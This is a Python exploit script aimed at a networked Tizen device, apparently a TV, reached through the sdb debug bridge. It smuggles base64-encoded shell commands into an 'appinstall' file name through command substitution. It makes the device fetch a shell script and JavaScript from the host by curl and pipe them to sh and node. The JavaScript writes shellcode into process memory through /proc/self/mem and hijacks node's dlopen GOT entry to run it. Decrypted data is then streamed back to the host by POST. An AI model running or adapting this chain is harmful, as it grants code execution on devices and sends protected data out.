#!/usr/bin/env python3
import argparse
import base64
import http.server
import queue
import socket
import subprocess
import threading
import time
import uuid
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
HOST_IP = "192.168.1.43"
SDB = ROOT / "tools" / "tizen-sdb" / "data" / "tools" / "sdb.exe"
SERIAL = "192.168.1.46:26101"
NODE_DLOPEN_GOT = 0x009A3B88


def build_js(shellcode: bytes) -> bytes:
    encoded = base64.b64encode(shellcode).decode("ascii")
    js = f"""
var f=require('fs');
var sc=new Buffer('{encoded}','base64');
var maps=f.readFileSync('/proc/self/maps','utf8').split('\\n');
var target=0;
for (var i=0;i<maps.length;i++) {{
  var line=maps[i];
  if (line.indexOf('rwxp') < 0) continue;
  var range=line.split(' ')[0].split('-');
  var start=parseInt(range[0],16), end=parseInt(range[1],16);
  if ((end-start) > sc.length + 4096) {{
    target=start+2048;
    break;
  }}
}}
if (!target) {{
  f.writeFileSync('/tmp/codex_node_shellcode_err.txt','no rwxp mapping\\n'+maps.join('\\n'));
  process.exit(3);
}}
f.writeFileSync('/tmp/codex_node_shellcode_target.txt','0x'+target.toString(16)+'\\n');
var mem=f.openSync('/proc/self/mem','r+');
f.writeSync(mem,sc,0,sc.length,target);
var p=new Buffer(4);
p.writeUInt32LE(target,0);
f.writeSync(mem,p,0,4,{NODE_DLOPEN_GOT});
var x={{exports:{{}}}};
try {{
  process.dlopen(x,'/tmp/nonexistent.node');
}} catch(e) {{
  f.writeFileSync('/tmp/codex_node_shellcode_err.txt', e.message + '\\n');
}}
"""
    return js.encode("utf-8")


def pick_port() -> int:
    with socket.socket() as s:
        s.bind((HOST_IP, 0))
        return s.getsockname()[1]


def shquote(s: str) -> str:
    return "'" + s.replace("'", "'\"'\"'") + "'"


def run_raw_sdb(command: str, timeout: int) -> subprocess.CompletedProcess:
    encoded = base64.b64encode(f"({command}) 2>/tmp/swu_fifo_outer.err".encode("utf-8")).decode("ascii")
    remote = f"echo${{IFS}}-n${{IFS}}'{encoded}'|base64${{IFS}}-d|sh"
    arg = f"0 appinstall tpk codex.tpk$({remote}).tpk"
    return subprocess.run(
        [str(SDB), "-s", SERIAL, "shell", arg],
        cwd=str(ROOT),
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
    )


def popen_raw_sdb(command: str) -> subprocess.Popen:
    encoded = base64.b64encode(f"({command}) 2>/tmp/swu_fifo_outer.err".encode("utf-8")).decode("ascii")
    remote = f"echo${{IFS}}-n${{IFS}}'{encoded}'|base64${{IFS}}-d|sh"
    arg = f"0 appinstall tpk codex.tpk$({remote}).tpk"
    return subprocess.Popen(
        [str(SDB), "-s", SERIAL, "shell", arg],
        cwd=str(ROOT),
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )


class Handler(http.server.BaseHTTPRequestHandler):
    cipher_path = None
    cipher_len = 0
    js = b""
    poster_js = b""
    run_sh = b""
    out_path = None
    messages = None

    def do_GET(self):
        if self.path == "/cipher":
            self.send_response(200)
            self.send_header("Content-Length", str(self.cipher_len))
            self.end_headers()
            total = 0
            next_report = 16 * 1024 * 1024
            self.messages.put(("GET_START", self.path, self.cipher_len))
            with self.cipher_path.open("rb") as f:
                while True:
                    chunk = f.read(1024 * 256)
                    if not chunk:
                        break
                    self.wfile.write(chunk)
                    total += len(chunk)
                    if total >= next_report:
                        self.messages.put(("GET_PROGRESS", self.path, total))
                        next_report += 16 * 1024 * 1024
            self.messages.put(("GET", self.path, total))
            return
        elif self.path == "/sc.js":
            body = self.js
        elif self.path == "/poster.js":
            body = self.poster_js
        elif self.path == "/run.sh":
            body = self.run_sh
        else:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        self.messages.put(("GET", self.path, len(body)))

    def do_POST(self):
        total = 0
        next_report = 16 * 1024 * 1024
        self.out_path.parent.mkdir(parents=True, exist_ok=True)
        self.messages.put(("POST_START", self.path, 0))
        with self.out_path.open("wb") as f:
            if self.headers.get("transfer-encoding", "").lower() == "chunked":
                while True:
                    line = self.rfile.readline().strip()
                    if not line:
                        continue
                    size = int(line.split(b";", 1)[0], 16)
                    if size == 0:
                        self.rfile.readline()
                        break
                    data = self.rfile.read(size)
                    f.write(data)
                    total += len(data)
                    if total >= next_report:
                        self.messages.put(("POST_PROGRESS", self.path, total))
                        next_report += 16 * 1024 * 1024
                    self.rfile.read(2)
            else:
                remaining = int(self.headers.get("content-length", "0"))
                while remaining > 0:
                    data = self.rfile.read(min(65536, remaining))
                    if not data:
                        break
                    f.write(data)
                    total += len(data)
                    remaining -= len(data)
                    if total >= next_report:
                        self.messages.put(("POST_PROGRESS", self.path, total))
                        next_report += 16 * 1024 * 1024
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
        self.messages.put(("POST", self.path, total))

    def log_message(self, *args):
        return


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--cipher", type=Path, required=True)
    ap.add_argument("--shellcode", type=Path, required=True)
    ap.add_argument("--out", type=Path, required=True)
    ap.add_argument("--timeout", type=int, default=90)
    ap.add_argument("--idle-timeout", type=int, default=60)
    args = ap.parse_args()

    Handler.cipher_path = args.cipher
    Handler.cipher_len = args.cipher.stat().st_size
    Handler.js = build_js(args.shellcode.read_bytes())
    Handler.out_path = args.out
    Handler.messages = queue.Queue()

    port = pick_port()
    Handler.poster_js = f"""
var fs=require('fs');
var http=require('http');
var req=http.request({{host:'{HOST_IP}',port:{port},path:'/plain',method:'POST'}}, function(res) {{
  res.on('data', function(){{}});
  res.on('end', function() {{
    try {{ fs.writeFileSync('/tmp/swu_fifo_poster.log','post_end\\n'); }} catch(e) {{}}
  }});
}});
req.on('error', function(e) {{
  try {{ fs.writeFileSync('/tmp/swu_fifo_poster.err', String(e && (e.stack || e.message || e)) + '\\n'); }} catch(x) {{}}
}});
var s=fs.createReadStream('/tmp/swu_plain_fifo');
s.on('error', function(e) {{
  try {{ fs.writeFileSync('/tmp/swu_fifo_poster.err', String(e && (e.stack || e.message || e)) + '\\n'); }} catch(x) {{}}
  try {{ req.end(); }} catch(x) {{}}
}});
s.on('end', function() {{ req.end(); }});
s.pipe(req, {{end:false}});
""".encode("utf-8")
    server = http.server.ThreadingHTTPServer((HOST_IP, port), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    lock = f"/tmp/swu_fifo_lock_{uuid.uuid4().hex}"
    watchdog = args.timeout + 60
    run_sh = (
        f"mkdir {lock} || exit 0; "
        "rm -f /tmp/swu_cipher_fifo /tmp/swu_plain_fifo /tmp/swu_fifo_status.bin /tmp/swu_fifo_stream.log; "
        "mkfifo /tmp/swu_cipher_fifo /tmp/swu_plain_fifo; "
        f"(sleep {watchdog}; rm -f /tmp/swu_cipher_fifo /tmp/swu_plain_fifo /tmp/swu_fifo_stream.log /tmp/swu_fifo_outer.err; rmdir {lock} 2>/dev/null) >/dev/null 2>&1 & wd=$!; "
        f"(curl --http1.0 -m {args.timeout} -s http://{HOST_IP}:{port}/cipher > /tmp/swu_cipher_fifo; echo in_rc:$? >> /tmp/swu_fifo_stream.log) >/dev/null 2>&1 & "
        f"(curl -m 8 -s http://{HOST_IP}:{port}/poster.js|node; echo out_rc:$? >> /tmp/swu_fifo_stream.log) >/dev/null 2>&1 & "
        f"curl -m 8 -s http://{HOST_IP}:{port}/sc.js|node; "
        "kill $wd 2>/dev/null; "
        "sleep 1; cat /tmp/swu_fifo_stream.log 2>/dev/null; "
        "rm -f /tmp/swu_cipher_fifo /tmp/swu_plain_fifo /tmp/swu_fifo_stream.log /tmp/swu_fifo_outer.err"
    ).encode("utf-8")
    Handler.run_sh = run_sh
    remote = f"curl -m 8 -s http://{HOST_IP}:{port}/run.sh|sh"

    try:
        proc = popen_raw_sdb(remote)
        seen = []
        last_event = time.time()
        post_started = False
        post_complete = False
        deadline = time.time() + args.timeout + 25
        while time.time() < deadline:
            try:
                item = Handler.messages.get(timeout=0.5)
                seen.append(item)
                last_event = time.time()
                print("event", item, flush=True)
                if item[0] == "POST_START":
                    post_started = True
                if item[0] == "POST" and item[2] == Handler.cipher_len:
                    post_complete = True
            except queue.Empty:
                if post_complete and args.out.exists():
                    break
                if proc.poll() is not None and not post_started:
                    break
                if time.time() - last_event > args.idle_timeout:
                    proc.kill()
                    raise SystemExit(f"idle timeout after {args.idle_timeout}s with no stream events")
        else:
            proc.kill()
            raise SystemExit(f"timeout after {args.timeout + 25}s")

        if post_complete and proc.poll() is None:
            time.sleep(1)
        if proc.poll() is None and post_complete:
            proc.terminate()
        stdout = proc.communicate(timeout=5)[0] or ""
        print(stdout)

        drain_until = time.time() + 3
        while time.time() < drain_until:
            try:
                item = Handler.messages.get(timeout=0.2)
                seen.append(item)
                print("event", item, flush=True)
            except queue.Empty:
                break
        if post_complete and args.out.exists() and args.out.stat().st_size == Handler.cipher_len:
            print(f"wrote {args.out.stat().st_size} bytes to {args.out}")
        else:
            size = args.out.stat().st_size if args.out.exists() else 0
            raise SystemExit(f"plaintext POST incomplete: got {size} expected {Handler.cipher_len}")
    finally:
        server.shutdown()
        server.server_close()


if __name__ == "__main__":
    main()
